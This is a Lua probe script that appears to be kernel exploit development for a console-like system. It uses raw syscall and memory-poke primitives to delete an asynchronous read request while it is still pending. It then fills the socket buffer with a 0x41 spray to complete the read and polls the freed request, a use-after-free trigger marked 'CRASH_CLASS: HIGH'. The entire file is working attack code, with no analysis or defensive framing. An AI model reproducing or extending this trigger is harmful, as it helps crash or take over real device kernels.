-- CRASH_CLASS: HIGH
-- PROBE 604a: delete an aio read while it is still pending, then let it complete
print("=== PROBE 604a: DELETE A PENDING REQUEST ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end

local sc_sp,sc_create,sc_poll=mk(135),mk(669),mk(664)
local sc_del,sc_write,sc_close=mk(662),mk(4),mk(6)
local sv=memory.alloc(8) wq(N(sv),uint64(0))
pcall(function() sc_sp(uint64(1),uint64(1),uint64(0),U(N(sv))) end)
local fda,fdb=rd(N(sv)),rd(N(sv)+4)
print(string.format("[A] fd_a=%d fd_b=%d",fda,fdb))

local buf=memory.alloc(0x4000)
local data=memory.alloc(0x100)
local out=memory.alloc(0x40)
local cell=memory.alloc(16)
local pollo=memory.alloc(0x40)

local function pending()
    for i=0,0xFC,4 do wd(N(data)+i,0) end
    wd(N(data)+0,0) wd(N(data)+4,fda)
    wq(N(data)+8,U(N(buf))) wq(N(data)+0x10,uint64(0x4000)) wq(N(data)+0x18,uint64(0))
    wq(N(out),uint64(0))
    local ok,rv=pcall(function() return sc_create(uint64(1),U(N(data)),uint64(1),uint64(1),U(N(out))) end)
    if not ok or N(rv)~=0 then return nil end
    local id=rd(N(out))
    if id==nil then return nil end
    wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
    pcall(function() sc_poll(U(N(cell)),uint64(1),U(N(pollo))) end)
    return id,rd(N(pollo))
end

local id,st=pending()
if id==nil then print("[B] create failed"); return end
print(string.format("[B] pending id=%08X poll=%08X",id,st))

wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
local ok,rv=pcall(function() return sc_del(U(N(cell)),uint64(1),U(N(pollo))) end)
print(string.format("[C] delete ret=%s status=%08X",N(rv),rd(N(pollo))))

wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
pcall(function() sc_poll(U(N(cell)),uint64(1),U(N(pollo))) end)
print(string.format("[D] poll after delete=%08X",rd(N(pollo))))

local msg=memory.alloc(0x200)
for i=0,0x1FC,4 do wd(N(msg)+i,0x41414141) end
local wok,wrv=pcall(function() return sc_write(U(fdb),U(N(msg)),uint64(0x200),uint64(0),uint64(0),uint64(0)) end)
print(string.format("[E] wrote %s ret=%s",tostring(wok),N(wrv)))

for k=1,3 do
    wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
    pcall(function() sc_poll(U(N(cell)),uint64(1),U(N(pollo))) end)
    print(string.format("[F%d] poll=%08X",k,rd(N(pollo))))
end

-- health
local okc,badc=0,0
for k=1,4 do
    local i2=select(1,pending())
    if i2 then
        wd(N(cell),i2) wd(N(pollo),0xCCCCCCCC)
        pcall(function() sc_del(U(N(cell)),uint64(1),U(N(pollo))) end)
        if rd(N(pollo))==0 then okc=okc+1 else badc=badc+1 end
    else badc=badc+1 end
end
print(string.format("[G] health ok=%d bad=%d",okc,badc))
print("[Z] alive")
